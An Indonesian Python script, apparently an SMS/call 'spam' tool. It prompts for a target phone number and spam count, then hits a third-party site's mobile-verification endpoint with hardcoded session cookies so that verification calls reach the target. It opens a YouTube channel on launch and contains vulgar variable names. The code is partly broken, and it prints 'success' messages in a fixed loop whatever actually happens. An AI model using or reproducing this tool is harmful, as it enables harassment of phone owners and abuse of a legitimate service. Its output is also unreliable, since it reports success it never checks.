import time
import os
import sys
import requests
import json
from requests import post

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

os.system('clear')
os.system('xdg-open https://youtube.com/channel/UCOqxx2kjYPypVct2l81Y1Jw')
khamdihi_ganteng = ('''\x1b[1;96m
       _   _  _  _  _  _   __  ___   _   _   _
      | \_/ || || \| || | / _|| o \ / \ | \_/ |
      | \_/ || || \\  || | \_ \|  _/| o || \_/ |
      |_| |_||_||_|\_||_| |__/|_|  |_n_||_| |_|

\x1b[1;97m ─────────────────────────────────────────────────────
 [\x1b[1;96m×\x1b[1;97m] Created/author : Khamdihi xd
 [\x1b[1;96m×\x1b[1;97m] Github         : https://github.com/OPDIHI
 [\x1b[1;96m×\x1b[1;97m] Yt             : DIHI IT
\x1b[1;97m──────────────────────────────────────────────────────\n''')
print(khamdihi_ganteng)
no = str(input(' [?] Masukan Nomer target  : '))
jum = str(input(' [?] Jumlah spam sms : '))
if no =='':
   print(' [×] Harus di isi')
   exit()
if jum =='':
   print(' [×] Masukan jumlah ngentod')

headers = {
"X-Requested-With": "XMLHttpRequest",
"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
"Content-Type":" application/x-www-form-urlencoded; charset=UTF-8",
"Content-Type": "application/json",
"Origin": "https://id.jagreward.com",
"Referer": "https://id.jagreward.com/member/register/",
"Accept-Encoding": "gzip, deflate, br",
"Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
"__cfduid": "d4de1e7ea2ced09ecde54a568af1ac50b1584709816",
"_ga": "GA1.2.2037151396.1584709855",
"PHPSESSID": "n88pmtvvsdpf25898a9jeqbggc",
"DAPROPS": "sjs.webGlRenderer:PowerVR Rogue GE8320|bjs.accessDom:1|bcookieSupport:1|bcss.animations:1|bcss.columns:1|bcss.transforms:1|bcss.transitions:1|sdevicePixelRatio:1.75|idisplayColorDepth:24|bflashCapable:0|bhtml.audio:1|bhtml.canvas:1|bhtml.inlinesvg:1|bhtml.svg:1|bhtml.video:1|bjs.applicationCache:1|bjs.deviceMotion:1|bjs.deviceOrientation:0|bjs.geoLocation:1|bjs.indexedDB:1|bjs.json:1|bjs.localStorage:1|bjs.modifyCss:1|bjs.modifyDom:1|bjs.querySelector:1|bjs.sessionStorage:1|bjs.supportBasicJavaScript:1|bjs.supportConsoleLog:1|bjs.supportEventListener:1|bjs.supportEvents:1|bjs.touchEvents:1|bjs.webGl:1|bjs.webSockets:1|bjs.webSqlDatabase:1|bjs.webWorkers:1|bjs.xhr:1|iorientation:0|buserMedia:1|bjs.battery:0",
}
bro = {
"method": "CALL",
"countryCode": "id",
}

url = "https://id.jagreward.com/member/verify-mobile/"+(no)
req = requests.get(url,no,headers=bro).text
memek = json.loads(req)
xn = memek['result']
print(f' [✓] Berhasil spam ke -> '+no)
try:
    for i in range(3):
        print(' [✓] Berhasil spam ke -> '+no)
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
        print ("\033[1;91mStop!!")
